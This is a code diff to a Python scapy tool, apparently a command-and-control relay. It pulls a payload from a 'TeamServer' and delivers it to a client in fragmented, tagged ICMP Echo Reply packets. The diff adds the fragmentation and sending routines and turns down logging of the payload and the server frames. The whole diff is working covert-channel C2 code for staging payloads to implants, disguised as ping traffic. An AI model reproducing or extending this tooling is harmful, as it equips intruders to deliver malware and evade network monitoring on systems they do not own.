@@ -3,7 +3,7 @@ from scapy.all import sniff, send, IP, ICMP, Raw
 import struct
 import socket
 import math
-
+import time
 # Configure logging
 logging.basicConfig(level=logging.INFO, format="%(message)s")
 
@@ -14,7 +14,7 @@ MAX_DATA_PER_CHUNK = ICMP_PAYLOAD_SIZE - TAG_SIZE  # 996
 
 
 class Client:
-    def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size):
+    def __init__(self, client_ip, icmp_id, tag, expected_inbound_data_size = 0):
         logging.info(f"[+] Listening for transmission of {expected_inbound_data_size} total bytes, "
                      f"from {client_ip}, ID={icmp_id}, tag={tag}")
         self.client_ip = client_ip
@@ -64,7 +64,10 @@ class Client:
         self.ts_send_frame(b"block=100")
         self.ts_send_frame(b"go")
         self.payload = self.ts_recv_frame()
-        logging.info(f"[+] Received payload: {self.payload}")
+        logging.debug(f"[+] Received payload: {self.payload}")
+
+        if self.payload != b"":
+            logging.info(f"[+] Payload from <TeamServerIP> recieved successfully")
 
     def send_payload(self):
         """
@@ -73,9 +76,64 @@ class Client:
         if self.payload == b"":
             self.get_payload()
 
+            self.send_fragmented_icmp(
+                client_ip=self.client_ip,
+                client_icmp_id=self.icmp_id,
+                full_payload=self.payload,
+            )
+
+    def send_fragmented_icmp(self, client_ip, client_icmp_id, full_payload, tag=b"RQ47"):
+        """
+        Fragment `full_payload` into (ICMP_PAYLOAD_SIZE - TAG_SIZE) bytes each,
+        and send immediately (no extra wait). The first reply is seq=0 (size),
+        then seq=1..N data chunks.
+        """
+        # 1) Send seq=0 reply with total-size (4 bytes)
+        total_size = len(full_payload)
+        size_bytes = total_size.to_bytes(4, "big")
+
+        print(f"[*] Sending seq=0 reply to {client_ip} (ID={client_icmp_id}). Total payload={total_size} bytes")
+        self.send_icmp_packet(
+            ip_dst=client_ip,
+            icmp_id=client_icmp_id,
+            icmp_seq=0,
+            payload=size_bytes,
+            tag=tag
+        )
+
+        # 2) Send actual data in (ICMP_PAYLOAD_SIZE - TAG_SIZE) byte chunks
+        CHUNK_DATA_SIZE = ICMP_PAYLOAD_SIZE - len(tag)  # e.g. 500 - 4 = 496
+
+        offset = 0
+        seq = 1
+        while offset < len(full_payload):
+            chunk = full_payload[offset : offset + CHUNK_DATA_SIZE]
+            print(f"    → Sending data chunk seq={seq}, data_bytes={len(chunk)}")
+            self.send_icmp_packet(
+                ip_dst=client_ip,
+                icmp_id=client_icmp_id,
+                icmp_seq=seq,
+                payload=chunk,
+                tag=tag
+            )
+            offset += CHUNK_DATA_SIZE
+            seq += 1
+            time.sleep(.1)
+
+    def send_icmp_packet(self, ip_dst, icmp_id, icmp_seq, payload, tag=b"RQ47"):
+        """
+        Always send as an Echo Reply (type 0).
+        """
+        full_payload = tag + payload
+        packet = IP(dst=ip_dst) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=full_payload)
+        send(packet, verbose=False)
+        logging.debug(f"[+] Sent ICMP REPLY seq={icmp_seq}, len={len(full_payload)}")
+
+
+
     def ts_recv_frame(self):
         raw_size = self.sock.recv(4)
-        logging.info(f"Frame coming from TeamServer: {raw_size}")
+        logging.debug(f"Frame coming from TeamServer: {raw_size}")
         if len(raw_size) < 4:
             raise ConnectionError("Failed to receive frame size.")
         size = struct.unpack('<I', raw_size)[0]
@@ -90,7 +148,7 @@ class Client:
         return buffer
 
     def ts_send_frame(self, data: bytes):
-        logging.info(f"Frame going to TeamServer: {data}")
+        logging.debug(f"Frame going to TeamServer: {data}")
         size = len(data)
         self.sock.sendall(struct.pack('<I', size))
         self.sock.sendall(data)
